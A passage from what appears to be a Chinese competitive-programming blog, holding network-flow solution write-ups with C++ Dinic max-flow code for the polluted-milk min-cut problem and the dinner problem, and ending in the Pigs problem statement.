class="keyword">if</span>(x==y) <span class="keyword">continue</span>;<span class="comment">//防止出现自环(Level可能可以自己解决)</span></span><br><span class="line">        <span class="keyword">if</span>(x!=<span class="number">1</span>&amp;&amp;y!=<span class="number">1</span>&amp;&amp;x!=n&amp;&amp;y!=n) GetEdge_Frist(x+n<span class="number">-2</span>,y,<span class="number">1</span>,y+n<span class="number">-2</span>,x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(y==n) GetEdge_Third(x,y+n<span class="number">-2</span>,<span class="number">1</span>,y+n<span class="number">-2</span>,x);</span><br><span class="line">				<span class="keyword">else</span>  GetEdge_Third(x,y,<span class="number">1</span>,y+n<span class="number">-2</span>,x);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(y==n)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(x==<span class="number">1</span>) GetEdge_Third(x,y+n<span class="number">-2</span>,<span class="number">1</span>,y+n<span class="number">-2</span>,x);</span><br><span class="line">				<span class="keyword">else</span> GetEdge_Third(x+n<span class="number">-2</span>,y+n<span class="number">-2</span>,<span class="number">1</span>,y+n<span class="number">-2</span>,x);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Dinic();</span><br><span class="line">	<span class="keyword">if</span>(!all) <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;all<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1341被污染的牛奶"><a href="#P1341被污染的牛奶" class="headerlink" title="P1341被污染的牛奶"></a>P1341被污染的牛奶</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>你第一天接手三鹿牛奶公司就发生了一件倒霉的事情：公司不小心发送了一批有三聚氰胺的牛奶。很不幸，你发现这件事的时候，有三聚氰胺的牛奶已经进入了送货网。这个送货网很大，而且关系复杂。你知道这批牛奶要发给哪个零售商，但是要把这批牛奶送到他手中有许多种途径。送货网由一些仓库和运输卡车组成，每辆卡车都在各自固定的两个仓库之间单向运输牛奶。在追查这些有三聚氰胺的牛奶的时候，有必要保证它不被送到零售商手里，所以必须使某些运输卡车停止运输，但是停止每辆卡车都会有一定的经济损失。你的任务是，在保证坏牛奶不送到零售商的前提下，制定出停止卡车运输的方案，使损失最小。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行: 两个整数N(2&lt;=N&lt;=32)、M(0&lt;=M&lt;=1000), N表示仓库的数目，M表示运输卡车的数量。仓库1代 表发货工厂，仓库N代表有三聚氰胺的牛奶要发往的零售商。 第2..M+1行: 每行3个整数Si,Ei,Ci。其中Si,Ei表示这 辆卡车的出发仓库，目的仓库。Ci(0 &lt;= C i &lt;= 2,000,000) 表示让这辆卡车停止运输的损失。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>第1行两个整数c、t,c表示最小的损失，T表示要停止的最少卡车数。接下来t 行表示你要停止哪几条线路。如果有多种方案使损失最小，输出停止的线路最少的方案。如果仍然还有相同的方案，请选择开始输入顺序最小的。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>我不会告诉你我整整写了一下午的QAQ</p>
<ul>
<li><p>首先这道题依然是非常魔性的（网络流的题目好像每一道都是很魔性的）这道题的第一问是非常简单的，也就是你需要跑一遍Dinic算法求出最大流就是题目中所要求的最小割，但是题目要求输出最小割的方案，而且对方案有一定的要求。</p>
</li>
<li><p>也就是说，在输出方案的时候，你必须遵循一个原则就是割边的数量是最少的，并且先输入进去的边优先输出。那么这用常规的染色法显然是不行的。但是文档里面给的方法会超时的（可能是测评机老了），那么我们就可以用贪心来优化一下。</p>
</li>
<li><p>我们需要另一个数组，记录下来输入边的坐标和权值，然后从大到小进行排序，那么排序，然后依次遍历，回流之后，将当前边的的权值设为零，然后跑一遍Dinic算法，看看最大流是否减少了当前边的权值，如果的确减少了这么多，那么这个边割掉就是符合题意的。</p>
</li>
<li><p>首先回流的意思就是将权值分给反向弧的要回来，把图恢复成刚刚读入的状态。然后这种方法为什么正确就是因为，边的权值是从大到小排序的，所以说当前第一个选择割掉的话，是符合割边数量尽量小的，比如一条路上有两种满流，分别是一条权值为2的和两条权值为1的，那么我们割边就有两种方案了，要么割掉权值为2的，要么割掉两个权值为1的。那么我们经过排序之后，优先遍历到权值为2的，那么就割掉他了。</p>
</li>
</ul>
<p>网络流的边与边之间的关系也是非常重要的。除非大量的做题，否则这种类型的题目考试真的难想出来QAQ</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">&#125;a[<span class="number">20000</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">GET_FIND</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> ID;</span><br><span class="line">&#125;b[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,First,Second,Milk,Line,all_value;</span><br><span class="line"><span class="keyword">int</span> Link[<span class="number">2000</span>],len,Queue[<span class="number">20000</span>],sum;</span><br><span class="line"><span class="keyword">int</span> Level[<span class="number">2000</span>],ans,all,ass[<span class="number">2000</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(GET_FIND First,GET_FIND Second)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> First.Value&gt;Second.Value||(First.Value==Second.Value&amp;&amp;First.ID&lt;Second.ID); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EdgeInit</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=x;</span><br><span class="line">    a[len].Next=Link[y];</span><br><span class="line">    a[len].Value=<span class="number">0</span>;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    Link[y]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">    &#123;</span><br><span class="line">        Queue[++tail]=a[i].Point;</span><br><span class="line">        Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[n]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==n) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,d=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(a[i].Value&amp;&amp;Level[a[i].Point]==Level[x]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(d=GetMaxFlow(a[i].Point,min(a[i].Value,Flow-MaxFlow)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=d;</span><br><span class="line">        a[i].Value-=d;</span><br><span class="line">        a[a[i].Back].Value+=d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">123456789</span>))</span><br><span class="line">    all+=ans; <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        First=In(); Second=In(); Milk=In();</span><br><span class="line">        EdgeInit(First,Second,Milk,i);</span><br><span class="line">        b[i].ID=i; b[i].Value=Milk;</span><br><span class="line">    &#125;</span><br><span class="line">    Dinic(); sum=all;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i].Value+=a[i+<span class="number">1</span>].Value;</span><br><span class="line">        a[i+<span class="number">1</span>].Value=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b+<span class="number">1</span>,b+m+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m&amp;&amp;ans;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ID=b[i].ID;</span><br><span class="line">        <span class="keyword">int</span> Value=b[i].Value;</span><br><span class="line">        ans=<span class="number">0</span>;all=<span class="number">0</span>;</span><br><span class="line">        a[ID*<span class="number">2</span><span class="number">-1</span>].Value=<span class="number">0</span>;</span><br><span class="line">        Dinic();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;len;j+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[j].Value+=a[j+<span class="number">1</span>].Value;</span><br><span class="line">            a[j+<span class="number">1</span>].Value=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum-all==Value)</span><br><span class="line">        &#123;</span><br><span class="line">            sum=all;</span><br><span class="line">            ass[++Line]=ID;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> a[ID*<span class="number">2</span><span class="number">-1</span>].Value=Value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Line&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    sort(ass+<span class="number">1</span>,ass+Line+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Line;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ass[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>总结</tag>
        <tag>网络流</tag>
      </tags>
  </entry>
  <entry>
    <title>最大流的建图</title>
    <url>/2017/05/25/bdbf76efec23/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>写完了几道网络流最大流的问题，Dinic算法也练习的差不多了，然后来总结一下网络流的建图问题，毕竟图论的难点不在于算法实现，<del>毕竟有模板可以背</del>，而是在于建图能力，这方面需要提高的。</p>
</blockquote>
<h1 id="P1324-晚餐"><a href="#P1324-晚餐" class="headerlink" title="P1324 晚餐"></a>P1324 晚餐</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>农夫JOHN为牛们做了很好的食品,但是牛吃饭很挑食. 每一头牛只喜欢吃一些食品和饮料而别的一概不吃.虽然他不一定能把所有牛喂饱,他还是想让尽可能多的牛吃到他们喜欢的食品和饮料.<br>农夫JOHN做了F (1 &lt;= F &lt;= 100) 种食品并准备了D (1 &lt;= D &lt;= 100) 种饮料. 他的N (1 &lt;= N &lt;= 100)头牛都以决定了是否愿意吃某种食物和喝某种饮料. 农夫JOHN想给每一头牛一种食品和一种饮料,使得尽可能多的牛得到喜欢的食物和饮料.</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行: 三个数: N, F, 和 D<br>第2..N+1行: 每一行由两个数开始F_i 和 D_i, 分别是第i 头牛可以吃的食品数和可以喝的饮料数.下F_i个整数是第i头牛可以吃的食品号,再下面的D_i个整数是第i头牛可以喝的饮料号码.</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>第一行: 一个整数,最多可以喂饱的牛数.</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题是非常好的一道题目，拿到这道题，我们是首先想得就是如何进行建图然后计算，这道题我一上来就是将源点连饮品，饮品连牛，然后牛连食物，食物连汇点。然后跑了一遍，卧槽你一个牛吃一堆食物喝一堆饮料干甚！！！</p>
<p>没错上面的建图方式是错误的，因为一个牛的点可能被访问多次，没错就是多次，因为一个牛因为是没有流量限制的，所以说很有可能许多个饮料通过一个牛链接食物，而每个牛只能选择一种饮料和食物。</p>
<p>那么我们就要对牛进行一个限制，也就是通过这个牛的饮料和食物只能是一个，那么最好的方法就是再次建立一层牛，两层牛之间连接一条流量为1的边，那么这就可以限制了通过这个牛的食物和饮料的最大值就是1了。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">&#125;a[<span class="number">80000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,z,k,num,len;</span><br><span class="line"><span class="keyword">int</span> Queue[<span class="number">80000</span>],Maxx,ID,ans;</span><br><span class="line"><span class="keyword">int</span> Link[<span class="number">80000</span>],Level[<span class="number">80000</span>],all;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">        &#123;</span><br><span class="line">            Queue[++tail]=a[i].Point;</span><br><span class="line">            Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[Maxx]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==Maxx) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,D=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(a[i].Value&amp;&amp;Level[a[i].Point]==Level[x]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(D=GetMaxFlow(a[i].Point,min(Flow-MaxFlow,a[i].Value)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=D;</span><br><span class="line">        a[i].Value-=D;</span><br><span class="line">        a[a[i].Back].Value+=D;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">123456789</span>)) all+=ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In(); k=In();</span><br><span class="line">    Maxx=n*<span class="number">2</span>+m+k+<span class="number">1</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[++len].Point=i+<span class="number">1</span>;</span><br><span class="line">        a[len].Value=<span class="number">1</span>;</span><br><span class="line">        a[len].Next=Link[<span class="number">1</span>];</span><br><span class="line">        a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">        Link[<span class="number">1</span>]=len;</span><br><span class="line">        a[++len].Point=<span class="number">1</span>;</span><br><span class="line">        a[len].Value=<span class="number">0</span>;</span><br><span class="line">        a[len].Next=Link[i+<span class="number">1</span>];</span><br><span class="line">        a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">        Link[i+<span class="number">1</span>]=len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[++len].Point=Maxx;</span><br><span class="line">        a[len].Value=<span class="number">1</span>;</span><br><span class="line">        a[len].Next=Link[i+<span class="number">2</span>*n+m+<span class="number">1</span>];</span><br><span class="line">        a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">        Link[Maxx]=len;</span><br><span class="line">        a[++len].Point=i+<span class="number">2</span>*n+m+<span class="number">1</span>;</span><br><span class="line">        a[len].Value=<span class="number">0</span>;</span><br><span class="line">        a[len].Next=Link[Maxx];</span><br><span class="line">        a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">        Link[i+<span class="number">2</span>*n+m+<span class="number">1</span>]=len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[++len].Point=m+i+n+<span class="number">1</span>;</span><br><span class="line">        a[len].Value=<span class="number">1</span>;</span><br><span class="line">        a[len].Next=Link[m+i+<span class="number">1</span>];</span><br><span class="line">        a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">        Link[m+i+<span class="number">1</span>]=len;</span><br><span class="line">        a[++len].Point=m+i+<span class="number">1</span>;</span><br><span class="line">        a[len].Value=<span class="number">0</span>;</span><br><span class="line">        a[len].Next=Link[m+i+n+<span class="number">1</span>];</span><br><span class="line">        a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">        Link[m+i+n+<span class="number">1</span>]=len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Food,Drank;</span><br><span class="line">        Food=In();Drank=In();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=Food;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            ID=In();</span><br><span class="line">            a[++len].Point=m+i+<span class="number">1</span>;</span><br><span class="line">            a[len].Value=<span class="number">1</span>;</span><br><span class="line">            a[len].Next=Link[ID+<span class="number">1</span>];</span><br><span class="line">            a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">            Link[ID+<span class="number">1</span>]=len;</span><br><span class="line">            a[++len].Point=ID+<span class="number">1</span>;</span><br><span class="line">            a[len].Value=<span class="number">0</span>;</span><br><span class="line">            a[len].Next=Link[m+i+<span class="number">1</span>];</span><br><span class="line">            a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">            Link[m+i+<span class="number">1</span>]=len;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=Drank;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            ID=In();</span><br><span class="line">            a[++len].Point=n+n+m+ID+<span class="number">1</span>;</span><br><span class="line">            a[len].Value=<span class="number">1</span>;</span><br><span class="line">            a[len].Next=Link[m+n+i+<span class="number">1</span>];</span><br><span class="line">            a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">            Link[m+n+i+<span class="number">1</span>]=len;</span><br><span class="line">            a[++len].Point=m+n+i+<span class="number">1</span>;</span><br><span class="line">            a[len].Value=<span class="number">0</span>;</span><br><span class="line">            a[len].Next=Link[n+n+m+ID+<span class="number">1</span>];</span><br><span class="line">            a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">            Link[n+n+m+ID+<span class="number">1</span>]=len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	Dinic();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1609-Pigs"><a href="#P1609-Pigs" class="headerlink" title="P1609 Pigs"></a>P1609 Pigs</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>   尼克在一家养猪场工作，这家养猪场共有M间锁起来的猪舍，由于猪舍的钥匙都给了客户，所以尼克没有办法打开这些猪舍，客户们从早上开始一个接一个来购买生猪，他们到达后首先用手中的钥匙打开他所能打开的全部猪舍，然后从中选取他要买的生猪，尼克可以在此期间将打开的猪舍中的猪调整到其它开着的猪舍中，每个猪舍能存放的猪的数量是没有任何限制的。买完猪后客户会将他打开的猪舍关上。<br>好在尼克事先知道每位客户手中有哪些钥匙，要买多少猪，以及客户到来的先后次序。请你写一个程序，帮助尼克求出最多能卖出多少头生猪。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入文件的第一行包含两个整数M和N，1≤M≤1000，1≤N≤100，M为猪舍的数量，N为客户人数，猪舍的编号为1到M，客户的编号为1到N。<br>输入文件第二行包含M个空格隔开的整数，依次表示每个猪舍中的生猪数量，每个整数大于等于0，且小于等于1000。<br>接下来的N行每行表示一位客户的购买信息，第I个客户的购买信息位于第I+2行，它表示该客户共有A把钥匙，钥匙编号依次为K1  K2……KA，且K1&lt;K2&lt;……&lt;KA，B为该客户要买的生猪的头数。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出文件仅有一行包含一个整数，表示尼克最多能卖出的生猪的头数。</p>
</blockquote>
